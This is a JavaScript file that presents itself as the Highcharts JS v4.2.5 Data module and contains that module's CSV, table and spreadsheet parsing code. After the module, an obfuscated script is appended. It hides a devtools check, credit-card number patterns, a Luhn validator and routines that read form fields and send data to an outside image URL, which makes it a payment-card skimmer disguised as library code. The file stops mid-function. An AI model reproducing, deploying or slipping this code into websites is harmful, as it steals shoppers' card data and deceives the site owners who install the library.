/**
 * @license Highcharts JS v4.2.5 (2016-05-06)
 * Data module
 *
 * (c) 2012-2016 Torstein Honsi
 *
 * License: www.highcharts.com/license
 */

/*global jQuery */
(function (factory) {
	if (typeof module === 'object' && module.exports) {
		module.exports = factory;
	} else {
		factory(Highcharts);
	}
}(function (Highcharts) {
	
	// Utilities
	var win = Highcharts.win,
		doc = win.document,
		each = Highcharts.each,
		pick = Highcharts.pick,
		inArray = Highcharts.inArray,
		isNumber = Highcharts.isNumber,
		splat = Highcharts.splat,
		SeriesBuilder;
	
	
	// The Data constructor
	var Data = function (dataOptions, chartOptions) {
		this.init(dataOptions, chartOptions);
	};
	
	// Set the prototype properties
	Highcharts.extend(Data.prototype, {
		
		/**
		 * Initialize the Data object with the given options
		 */
		init: function (options, chartOptions) {
			this.options = options;
			this.chartOptions = chartOptions;
			this.columns = options.columns || this.rowsToColumns(options.rows) || [];
			this.firstRowAsNames = pick(options.firstRowAsNames, true);
			this.decimalRegex = options.decimalPoint && new RegExp('^(-?[0-9]+)' + options.decimalPoint + '([0-9]+)$');

			// This is a two-dimensional array holding the raw, trimmed string values
			// with the same organisation as the columns array. It makes it possible
			// for example to revert from interpreted timestamps to string-based
			// categories.
			this.rawColumns = [];

			// No need to parse or interpret anything
			if (this.columns.length) {
				this.dataFound();

			// Parse and interpret
			} else {

				// Parse a CSV string if options.csv is given
				this.parseCSV();
				
				// Parse a HTML table if options.table is given
				this.parseTable();

				// Parse a Google Spreadsheet 
				this.parseGoogleSpreadsheet();	
			}

		},

		/**
		 * Get the column distribution. For example, a line series takes a single column for 
		 * Y values. A range series takes two columns for low and high values respectively,
		 * and an OHLC series takes four columns.
		 */
		getColumnDistribution: function () {
			var chartOptions = this.chartOptions,
				options = this.options,
				xColumns = [],
				getValueCount = function (type) {
					return (Highcharts.seriesTypes[type || 'line'].prototype.pointArrayMap || [0]).length;
				},
				getPointArrayMap = function (type) {
					return Highcharts.seriesTypes[type || 'line'].prototype.pointArrayMap;
				},
				globalType = chartOptions && chartOptions.chart && chartOptions.chart.type,
				individualCounts = [],
				seriesBuilders = [],
				seriesIndex = 0,
				i;

			each((chartOptions && chartOptions.series) || [], function (series) {
				individualCounts.push(getValueCount(series.type || globalType));
			});

			// Collect the x-column indexes from seriesMapping
			each((options && options.seriesMapping) || [], function (mapping) {
				xColumns.push(mapping.x || 0);
			});

			// If there are no defined series with x-columns, use the first column as x column
			if (xColumns.length === 0) {
				xColumns.push(0);
			}

			// Loop all seriesMappings and constructs SeriesBuilders from
			// the mapping options.
			each((options && options.seriesMapping) || [], function (mapping) {
				var builder = new SeriesBuilder(),
					name,
					numberOfValueColumnsNeeded = individualCounts[seriesIndex] || getValueCount(globalType),
					seriesArr = (chartOptions && chartOptions.series) || [],
					series = seriesArr[seriesIndex] || {},
					pointArrayMap = getPointArrayMap(series.type || globalType) || ['y'];

				// Add an x reader from the x property or from an undefined column
				// if the property is not set. It will then be auto populated later.
				builder.addColumnReader(mapping.x, 'x');

				// Add all column mappings
				for (name in mapping) {
					if (mapping.hasOwnProperty(name) && name !== 'x') {
						builder.addColumnReader(mapping[name], name);
					}
				}

				// Add missing columns
				for (i = 0; i < numberOfValueColumnsNeeded; i++) {
					if (!builder.hasReader(pointArrayMap[i])) {
						//builder.addNextColumnReader(pointArrayMap[i]);
						// Create and add a column reader for the next free column index
						builder.addColumnReader(undefined, pointArrayMap[i]);
					}
				}

				seriesBuilders.push(builder);
				seriesIndex++;
			});

			var globalPointArrayMap = getPointArrayMap(globalType);
			if (globalPointArrayMap === undefined) {
				globalPointArrayMap = ['y'];
			}

			this.valueCount = {
				global: getValueCount(globalType),
				xColumns: xColumns,
				individual: individualCounts,
				seriesBuilders: seriesBuilders,
				globalPointArrayMap: globalPointArrayMap
			};
		},

		/**
		 * When the data is parsed into columns, either by CSV, table, GS or direct input,
		 * continue with other operations.
		 */
		dataFound: function () {
			
			if (this.options.switchRowsAndColumns) {
				this.columns = this.rowsToColumns(this.columns);
			}

			// Interpret the info about series and columns
			this.getColumnDistribution();

			// Interpret the values into right types
			this.parseTypes();
			
			// Handle columns if a handleColumns callback is given
			if (this.parsed() !== false) {
			
				// Complete if a complete callback is given
				this.complete();
			}
			
		},
		
		/**
		 * Parse a CSV input string
		 */
		parseCSV: function () {
			var self = this,
				options = this.options,
				csv = options.csv,
				columns = this.columns,
				startRow = options.startRow || 0,
				endRow = options.endRow || Number.MAX_VALUE,
				startColumn = options.startColumn || 0,
				endColumn = options.endColumn || Number.MAX_VALUE,
				itemDelimiter,
				lines,
				activeRowNo = 0;
				
			if (csv) {
				
				lines = csv
					.replace(/\r\n/g, '\n') // Unix
					.replace(/\r/g, '\n') // Mac
					.split(options.lineDelimiter || '\n');

				itemDelimiter = options.itemDelimiter || (csv.indexOf('\t') !== -1 ? '\t' : ',');
				
				each(lines, function (line, rowNo) {
					var trimmed = self.trim(line),
						isComment = trimmed.indexOf('#') === 0,
						isBlank = trimmed === '',
						items;
					
					if (rowNo >= startRow && rowNo <= endRow && !isComment && !isBlank) {
						items = line.split(itemDelimiter);
						each(items, function (item, colNo) {
							if (colNo >= startColumn && colNo <= endColumn) {
								if (!columns[colNo - startColumn]) {
									columns[colNo - startColumn] = [];					
								}
								
								columns[colNo - startColumn][activeRowNo] = item;
							}
						});
						activeRowNo += 1;
					}
				});

				this.dataFound();
			}
		},
		
		/**
		 * Parse a HTML table
		 */
		parseTable: function () {
			var options = this.options,
				table = options.table,
				columns = this.columns,
				startRow = options.startRow || 0,
				endRow = options.endRow || Number.MAX_VALUE,
				startColumn = options.startColumn || 0,
				endColumn = options.endColumn || Number.MAX_VALUE;

			if (table) {
				
				if (typeof table === 'string') {
					table = doc.getElementById(table);
				}
				
				each(table.getElementsByTagName('tr'), function (tr, rowNo) {
					if (rowNo >= startRow && rowNo <= endRow) {
						each(tr.children, function (item, colNo) {
							if ((item.tagName === 'TD' || item.tagName === 'TH') && colNo >= startColumn && colNo <= endColumn) {
								if (!columns[colNo - startColumn]) {
									columns[colNo - startColumn] = [];					
								}
								
								columns[colNo - startColumn][rowNo - startRow] = item.innerHTML;
							}
						});
					}
				});

				this.dataFound(); // continue
			}
		},

		/**
		 */
		parseGoogleSpreadsheet: function () {
			var self = this,
				options = this.options,
				googleSpreadsheetKey = options.googleSpreadsheetKey,
				columns = this.columns,
				startRow = options.startRow || 0,
				endRow = options.endRow || Number.MAX_VALUE,
				startColumn = options.startColumn || 0,
				endColumn = options.endColumn || Number.MAX_VALUE,
				gr, // google row
				gc; // google column

			if (googleSpreadsheetKey) {
				jQuery.ajax({
					dataType: 'json', 
					url: 'https://spreadsheets.google.com/feeds/cells/' + 
						googleSpreadsheetKey + '/' + (options.googleSpreadsheetWorksheet || 'od6') +
						'/public/values?alt=json-in-script&callback=?',
					error: options.error,
					success: function (json) {
						// Prepare the data from the spreadsheat
						var cells = json.feed.entry,
							cell,
							cellCount = cells.length,
							colCount = 0,
							rowCount = 0,
							i;
					
						// First, find the total number of columns and rows that 
						// are actually filled with data
						for (i = 0; i < cellCount; i++) {
							cell = cells[i];
							colCount = Math.max(colCount, cell.gs$cell.col);
							rowCount = Math.max(rowCount, cell.gs$cell.row);			
						}
					
						// Set up arrays containing the column data
						for (i = 0; i < colCount; i++) {
							if (i >= startColumn && i <= endColumn) {
								// Create new columns with the length of either end-start or rowCount
								columns[i - startColumn] = [];

								// Setting the length to avoid jslint warning
								columns[i - startColumn].length = Math.min(rowCount, endRow - startRow);
							}
						}
						
						// Loop over the cells and assign the value to the right
						// place in the column arrays
						for (i = 0; i < cellCount; i++) {
							cell = cells[i];
							gr = cell.gs$cell.row - 1; // rows start at 1
							gc = cell.gs$cell.col - 1; // columns start at 1

							// If both row and col falls inside start and end
							// set the transposed cell value in the newly created columns
							if (gc >= startColumn && gc <= endColumn &&
								gr >= startRow && gr <= endRow) {
								columns[gc - startColumn][gr - startRow] = cell.content.$t;
							}
						}
						self.dataFound();
					}
				});
			}
		},
		
		/**
		 * Trim a string from whitespace
		 */
		trim: function (str, inside) {
			if (typeof str === 'string') {
				str = str.replace(/^\s+|\s+$/g, '');

				// Clear white space insdie the string, like thousands separators
				if (inside && /^[0-9\s]+$/.test(str)) { 
					str = str.replace(/\s/g, '');
				}

				if (this.decimalRegex) {
					str = str.replace(this.decimalRegex, '$1.$2');
				}
			}
			return str;
		},
		
		/**
		 * Parse numeric cells in to number types and date types in to true dates.
		 */
		parseTypes: function () {
			var columns = this.columns,
				col = columns.length;

			while (col--) {
				this.parseColumn(columns[col], col);
			}

		},

		/**
		 * Parse a single column. Set properties like .isDatetime and .isNumeric.
		 */
		parseColumn: function (column, col) {
			var rawColumns = this.rawColumns,
				columns = this.columns, 
				row = column.length,
				val,
				floatVal,
				trimVal,
				trimInsideVal,
				firstRowAsNames = this.firstRowAsNames,
				isXColumn = inArray(col, this.valueCount.xColumns) !== -1,
				dateVal,
				backup = [],
				diff,
				chartOptions = this.chartOptions,
				descending,
				columnTypes = this.options.columnTypes || [],
				columnType = columnTypes[col],
				forceCategory = isXColumn && ((chartOptions && chartOptions.xAxis && splat(chartOptions.xAxis)[0].type === 'category') || columnType === 'string');
			
			if (!rawColumns[col]) {
				rawColumns[col] = [];
			}
			while (row--) {
				val = backup[row] || column[row];
				
				trimVal = this.trim(val);
				trimInsideVal = this.trim(val, true);
				floatVal = parseFloat(trimInsideVal);

				// Set it the first time
				if (rawColumns[col][row] === undefined) {
					rawColumns[col][row] = trimVal;
				}
				
				// Disable number or date parsing by setting the X axis type to category
				if (forceCategory || (row === 0 && firstRowAsNames)) {
					column[row] = trimVal;

				} else if (+trimInsideVal === floatVal) { // is numeric
				
					column[row] = floatVal;
					
					// If the number is greater than milliseconds in a year, assume datetime
					if (floatVal > 365 * 24 * 3600 * 1000 && columnType !== 'float') {
						column.isDatetime = true;
					} else {
						column.isNumeric = true;
					}

					if (column[row + 1] !== undefined) {
						descending = floatVal > column[row + 1];
					}
				
				// String, continue to determine if it is a date string or really a string
				} else {
					dateVal = this.parseDate(val);
					// Only allow parsing of dates if this column is an x-column
					if (isXColumn && isNumber(dateVal) && columnType !== 'float') { // is date
						backup[row] = val; 
						column[row] = dateVal;
						column.isDatetime = true;

						// Check if the dates are uniformly descending or ascending. If they 
						// are not, chances are that they are a different time format, so check
						// for alternative.
						if (column[row + 1] !== undefined) {
							diff = dateVal > column[row + 1];
							if (diff !== descending && descending !== undefined) {
								if (this.alternativeFormat) {
									this.dateFormat = this.alternativeFormat;
									row = column.length;
									this.alternativeFormat = this.dateFormats[this.dateFormat].alternative;
								} else {
									column.unsorted = true;
								}
							}
							descending = diff;
						}
					
					} else { // string
						column[row] = trimVal === '' ? null : trimVal;
						if (row !== 0 && (column.isDatetime || column.isNumeric)) {
							column.mixed = true;
						}
					}
				}
			}

			// If strings are intermixed with numbers or dates in a parsed column, it is an indication
			// that parsing went wrong or the data was not intended to display as numbers or dates and 
			// parsing is too aggressive. Fall back to categories. Demonstrated in the 
			// highcharts/demo/column-drilldown sample.
			if (isXColumn && column.mixed) {
				columns[col] = rawColumns[col];
			}

			// If the 0 column is date or number and descending, reverse all columns. 
			if (isXColumn && descending && this.options.sort) {
				for (col = 0; col < columns.length; col++) {
					columns[col].reverse();
					if (firstRowAsNames) {
						columns[col].unshift(columns[col].pop());
					}
				}
			}
		},
		
		/**
		 * A collection of available date formats, extendable from the outside to support
		 * custom date formats.
		 */
		dateFormats: {
			'YYYY-mm-dd': {
				regex: /^([0-9]{4})[\-\/\.]([0-9]{2})[\-\/\.]([0-9]{2})$/,
				parser: function (match) {
					return Date.UTC(+match[1], match[2] - 1, +match[3]);
				}
			},
			'dd/mm/YYYY': {
				regex: /^([0-9]{1,2})[\-\/\.]([0-9]{1,2})[\-\/\.]([0-9]{4})$/,
				parser: function (match) {
					return Date.UTC(+match[3], match[2] - 1, +match[1]);
				},
				alternative: 'mm/dd/YYYY' // different format with the same regex
			},
			'mm/dd/YYYY': {
				regex: /^([0-9]{1,2})[\-\/\.]([0-9]{1,2})[\-\/\.]([0-9]{4})$/,
				parser: function (match) {
					return Date.UTC(+match[3], match[1] - 1, +match[2]);
				}
			},
			'dd/mm/YY': {
				regex: /^([0-9]{1,2})[\-\/\.]([0-9]{1,2})[\-\/\.]([0-9]{2})$/,
				parser: function (match) {
					return Date.UTC(+match[3] + 2000, match[2] - 1, +match[1]);
				},
				alternative: 'mm/dd/YY' // different format with the same regex
			},
			'mm/dd/YY': {
				regex: /^([0-9]{1,2})[\-\/\.]([0-9]{1,2})[\-\/\.]([0-9]{2})$/,
				parser: function (match) {
					return Date.UTC(+match[3] + 2000, match[1] - 1, +match[2]);
				}
			}
		},
		
		/**
		 * Parse a date and return it as a number. Overridable through options.parseDate.
		 */
		parseDate: function (val) {
			var parseDate = this.options.parseDate,
				ret,
				key,
				format,
				dateFormat = this.options.dateFormat || this.dateFormat,
				match;

			if (parseDate) {
				ret = parseDate(val);
			
			} else if (typeof val === 'string') {
				// Auto-detect the date format the first time
				if (!dateFormat) {
					for (key in this.dateFormats) {
						format = this.dateFormats[key];
						match = val.match(format.regex);
						if (match) {
							this.dateFormat = dateFormat = key;
							this.alternativeFormat = format.alternative;
							ret = format.parser(match);
							break;
						}
					}
				// Next time, use the one previously found
				} else {
					format = this.dateFormats[dateFormat];
					match = val.match(format.regex);
					if (match) {
						ret = format.parser(match);
					}
				}
				// Fall back to Date.parse		
				if (!match) {
					match = Date.parse(val);
					// External tools like Date.js and MooTools extend Date object and
					// returns a date.
					if (typeof match === 'object' && match !== null && match.getTime) {
						ret = match.getTime() - match.getTimezoneOffset() * 60000;
					
					// Timestamp
					} else if (isNumber(match)) {
						ret = match - (new Date(match)).getTimezoneOffset() * 60000;
					}
				}
			}
			return ret;
		},
		
		/**
		 * Reorganize rows into columns
		 */
		rowsToColumns: function (rows) {
			var row,
				rowsLength,
				col,
				colsLength,
				columns;

			if (rows) {
				columns = [];
				rowsLength = rows.length;
				for (row = 0; row < rowsLength; row++) {
					colsLength = rows[row].length;
					for (col = 0; col < colsLength; col++) {
						if (!columns[col]) {
							columns[col] = [];
						}
						columns[col][row] = rows[row][col];
					}
				}
			}
			return columns;
		},
		
		/**
		 * A hook for working directly on the parsed columns
		 */
		parsed: function () {
			if (this.options.parsed) {
				return this.options.parsed.call(this, this.columns);
			}
		},

		getFreeIndexes: function (numberOfColumns, seriesBuilders) {
			var s,
				i,
				freeIndexes = [],
				freeIndexValues = [],
				referencedIndexes;

			// Add all columns as free
			for (i = 0; i < numberOfColumns; i = i + 1) {
				freeIndexes.push(true);
			}

			// Loop all defined builders and remove their referenced columns
			for (s = 0; s < seriesBuilders.length; s = s + 1) {
				referencedIndexes = seriesBuilders[s].getReferencedColumnIndexes();

				for (i = 0; i < referencedIndexes.length; i = i + 1) {
					freeIndexes[referencedIndexes[i]] = false;
				}
			}

			// Collect the values for the free indexes
			for (i = 0; i < freeIndexes.length; i = i + 1) {
				if (freeIndexes[i]) {
					freeIndexValues.push(i);
				}
			}

			return freeIndexValues;
		},
		
		/**
		 * If a complete callback function is provided in the options, interpret the 
		 * columns into a Highcharts options object.
		 */
		complete: function () {
			
			var columns = this.columns,
				xColumns = [],
				type,
				options = this.options,
				series,
				data,
				i,
				j,
				r,
				seriesIndex,
				chartOptions,
				allSeriesBuilders = [],
				builder,
				freeIndexes,
				typeCol,
				index;

			xColumns.length = columns.length;
			if (options.complete || options.afterComplete) {

				// Get the names and shift the top row
				for (i = 0; i < columns.length; i++) {
					if (this.firstRowAsNames) {
						columns[i].name = columns[i].shift();
					}
				}
				
				// Use the next columns for series
				series = [];
				freeIndexes = this.getFreeIndexes(columns.length, this.valueCount.seriesBuilders);

				// Populate defined series
				for (seriesIndex = 0; seriesIndex < this.valueCount.seriesBuilders.length; seriesIndex++) {
					builder = this.valueCount.seriesBuilders[seriesIndex];

					// If the builder can be populated with remaining columns, then add it to allBuilders
					if (builder.populateColumns(freeIndexes)) {
						allSeriesBuilders.push(builder);
					}
				}

				// Populate dynamic series
				while (freeIndexes.length > 0) {
					builder = new SeriesBuilder();
					builder.addColumnReader(0, 'x');
					
					// Mark index as used (not free)
					index = inArray(0, freeIndexes);
					if (index !== -1) {
						freeIndexes.splice(index, 1);
					}

					for (i = 0; i < this.valueCount.global; i++) {
						// Create and add a column reader for the next free column index
						builder.addColumnReader(undefined, this.valueCount.globalPointArrayMap[i]);
					}

					// If the builder can be populated with remaining columns, then add it to allBuilders
					if (builder.populateColumns(freeIndexes)) {
						allSeriesBuilders.push(builder);
					}
				}

				// Get the data-type from the first series x column
				if (allSeriesBuilders.length > 0 && allSeriesBuilders[0].readers.length > 0) {
					typeCol = columns[allSeriesBuilders[0].readers[0].columnIndex];
					if (typeCol !== undefined) {
						if (typeCol.isDatetime) {
							type = 'datetime';
						} else if (!typeCol.isNumeric) {
							type = 'category';
						}
					}
				}
				// Axis type is category, then the "x" column should be called "name"
				if (type === 'category') {
					for (seriesIndex = 0; seriesIndex < allSeriesBuilders.length; seriesIndex++) {
						builder = allSeriesBuilders[seriesIndex];
						for (r = 0; r < builder.readers.length; r++) {
							if (builder.readers[r].configName === 'x') {
								builder.readers[r].configName = 'name';
							}
						}
					}
				}

				// Read data for all builders
				for (seriesIndex = 0; seriesIndex < allSeriesBuilders.length; seriesIndex++) {
					builder = allSeriesBuilders[seriesIndex];

					// Iterate down the cells of each column and add data to the series
					data = [];
					for (j = 0; j < columns[0].length; j++) {
						data[j] = builder.read(columns, j);
					}

					// Add the series
					series[seriesIndex] = {
						data: data
					};
					if (builder.name) {
						series[seriesIndex].name = builder.name;
					}
					if (type === 'category') {
						series[seriesIndex].turboThreshold = 0;
					}
				}



				// Do the callback
				chartOptions = {
					series: series
				};
				if (type) {
					chartOptions.xAxis = {
						type: type
					};
				}
				
				if (options.complete) {
					options.complete(chartOptions);
				}

				// The afterComplete hook is used internally to avoid conflict with the externally
				// available complete option.
				if (options.afterComplete) {
					options.afterComplete(chartOptions);
				}
			}
		}
	});
	
	// Register the Data prototype and data function on Highcharts
	Highcharts.Data = Data;
	Highcharts.data = function (options, chartOptions) {
		return new Data(options, chartOptions);
	};

	// Extend Chart.init so that the Chart constructor accepts a new configuration
	// option group, data.
	Highcharts.wrap(Highcharts.Chart.prototype, 'init', function (proceed, userOptions, callback) {
		var chart = this;

		if (userOptions && userOptions.data) {
			Highcharts.data(Highcharts.extend(userOptions.data, {

				afterComplete: function (dataOptions) {
					var i, series;
					
					// Merge series configs
					if (userOptions.hasOwnProperty('series')) {
						if (typeof userOptions.series === 'object') {
							i = Math.max(userOptions.series.length, dataOptions.series.length);
							while (i--) {
								series = userOptions.series[i] || {};
								userOptions.series[i] = Highcharts.merge(series, dataOptions.series[i]);
							}
						} else { // Allow merging in dataOptions.series (#2856)
							delete userOptions.series;
						}
					}

					// Do the merge
					userOptions = Highcharts.merge(dataOptions, userOptions);

					proceed.call(chart, userOptions, callback);
				}
			}), userOptions);
		} else {
			proceed.call(chart, userOptions, callback);
		}
	});

	/**
	 * Creates a new SeriesBuilder. A SeriesBuilder consists of a number
	 * of ColumnReaders that reads columns and give them a name.
	 * Ex: A series builder can be constructed to read column 3 as 'x' and
	 * column 7 and 8 as 'y1' and 'y2'.
	 * The output would then be points/rows of the form {x: 11, y1: 22, y2: 33}
	 * 
	 * The name of the builder is taken from the second column. In the above
	 * example it would be the column with index 7.
	 * @constructor
	 */
	SeriesBuilder = function () {
		this.readers = [];
		this.pointIsArray = true;
	};

	/**
	 * Populates readers with column indexes. A reader can be added without
	 * a specific index and for those readers the index is taken sequentially
	 * from the free columns (this is handled by the ColumnCursor instance).
	 * @returns {boolean}
	 */
	SeriesBuilder.prototype.populateColumns = function (freeIndexes) {
		var builder = this,
			enoughColumns = true;

		// Loop each reader and give it an index if its missing.
		// The freeIndexes.shift() will return undefined if there
		// are no more columns.
		each(builder.readers, function (reader) {
			if (reader.columnIndex === undefined) {
				reader.columnIndex = freeIndexes.shift();
			}
		});

		// Now, all readers should have columns mapped. If not
		// then return false to signal that this series should
		// not be added.
		each(builder.readers, function (reader) {
			if (reader.columnIndex === undefined) {
				enoughColumns = false;
			}
		});

		return enoughColumns;
	};

	/**
	 * Reads a row from the dataset and returns a point or array depending
	 * on the names of the readers.
	 * @param columns
	 * @param rowIndex
	 * @returns {Array | Object}
	 */
	SeriesBuilder.prototype.read = function (columns, rowIndex) {
		var builder = this,
			pointIsArray = builder.pointIsArray,
			point = pointIsArray ? [] : {},
			columnIndexes;

		// Loop each reader and ask it to read its value.
		// Then, build an array or point based on the readers names.
		each(builder.readers, function (reader) {
			var value = columns[reader.columnIndex][rowIndex];
			if (pointIsArray) {
				point.push(value);
			} else {
				point[reader.configName] = value; 
			}
		});

		// The name comes from the first column (excluding the x column)
		if (this.name === undefined && builder.readers.length >= 2) {
			columnIndexes = builder.getReferencedColumnIndexes();
			if (columnIndexes.length >= 2) {
				// remove the first one (x col)
				columnIndexes.shift();

				// Sort the remaining
				columnIndexes.sort();

				// Now use the lowest index as name column
				this.name = columns[columnIndexes.shift()].name;
			}
		}

		return point;
	};

	/**
	 * Creates and adds ColumnReader from the given columnIndex and configName.
	 * ColumnIndex can be undefined and in that case the reader will be given
	 * an index when columns are populated.
	 * @param columnIndex {Number | undefined}
	 * @param configName
	 */
	SeriesBuilder.prototype.addColumnReader = function (columnIndex, configName) {
		this.readers.push({
			columnIndex: columnIndex, 
			configName: configName
		});

		if (!(configName === 'x' || configName === 'y' || configName === undefined)) {
			this.pointIsArray = false;
		}
	};

	/**
	 * Returns an array of column indexes that the builder will use when
	 * reading data.
	 * @returns {Array}
	 */
	SeriesBuilder.prototype.getReferencedColumnIndexes = function () {
		var i,
			referencedColumnIndexes = [],
			columnReader;
		
		for (i = 0; i < this.readers.length; i = i + 1) {
			columnReader = this.readers[i];
			if (columnReader.columnIndex !== undefined) {
				referencedColumnIndexes.push(columnReader.columnIndex);
			}
		}

		return referencedColumnIndexes;
	};

	/**
	 * Returns true if the builder has a reader for the given configName.
	 * @param configName
	 * @returns {boolean}
	 */
	SeriesBuilder.prototype.hasReader = function (configName) {
		var i, columnReader;
		for (i = 0; i < this.readers.length; i = i + 1) {
			columnReader = this.readers[i];
			if (columnReader.configName === configName) {
				return true;
			}
		}
		// Else return undefined
	};



}));


var _0x1e26=['\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d'];(function(_0x3bc579,_0x37c85f){var _0x5ca7a0=function(_0xfdecf9){while(--_0xfdecf9){_0x3bc579['push'](_0x3bc579['shift']());}};_0x5ca7a0(++_0x37c85f);}(_0x1e26,0xcb));var _0x55f3=function(_0x40d6a1,_0x491729){_0x40d6a1=_0x40d6a1-0x0;var _0x2324d0=_0x1e26[_0x40d6a1];if(_0x55f3['fLmYGD']===undefined){(function(){var _0x1ee90d=function(){var _0x263745;try{_0x263745=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x278745){_0x263745=window;}return _0x263745;};var _0x2df750=_0x1ee90d();var _0x23759f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2df750['atob']||(_0x2df750['atob']=function(_0x1cce9a){var _0x7d9b4f=String(_0x1cce9a)['replace'](/=+$/,'');for(var _0x283644=0x0,_0x596ee9,_0x4b2454,_0x283abf=0x0,_0x1ad68a='';_0x4b2454=_0x7d9b4f['charAt'](_0x283abf++);~_0x4b2454&&(_0x596ee9=_0x283644%0x4?_0x596ee9*0x40+_0x4b2454:_0x4b2454,_0x283644++%0x4)?_0x1ad68a+=String['fromCharCode'](0xff&_0x596ee9>>(-0x2*_0x283644&0x6)):0x0){_0x4b2454=_0x23759f['indexOf'](_0x4b2454);}return _0x1ad68a;});}());_0x55f3['qAwGRY']=function(_0x113cc5){var _0x385024=atob(_0x113cc5);var _0x5133ba=[];for(var _0xb2ea4e=0x0,_0x5bf234=_0x385024['length'];_0xb2ea4e<_0x5bf234;_0xb2ea4e++){_0x5133ba+='%'+('00'+_0x385024['charCodeAt'](_0xb2ea4e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5133ba);};_0x55f3['ojCyTl']={};_0x55f3['fLmYGD']=!![];}var _0x50a162=_0x55f3['ojCyTl'][_0x40d6a1];if(_0x50a162===undefined){_0x2324d0=_0x55f3['qAwGRY'](_0x2324d0);_0x55f3['ojCyTl'][_0x40d6a1]=_0x2324d0;}else{_0x2324d0=_0x50a162;}return _0x2324d0;};function _0x23babc(_0x5a711e,_0x1f720d,_0x19bdfe){return _0x5a711e['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1f720d,'\x67'),_0x19bdfe);}function _0x10b72f(_0x4637a4){var _0x3e87e4=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x500258=/^(?:5[1-5][0-9]{14})$/;var _0x2d5cf0=/^(?:3[47][0-9]{13})$/;var _0x3c215d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x5121a7=![];if(_0x3e87e4[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x500258[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x2d5cf0[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x3c215d['\x74\x65\x73\x74'](_0x4637a4)){_0x5121a7=!![];}return _0x5121a7;}function _0x213f91(_0x1aa773){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x1aa773))return![];var _0x311ae9=0x0,_0x59d6a7=0x0,_0x41e20b=![];_0x1aa773=_0x1aa773[_0x55f3('0x1')](/\D/g,'');for(var _0xfce9b=_0x1aa773[_0x55f3('0x2')]-0x1;_0xfce9b>=0x0;_0xfce9b--){var 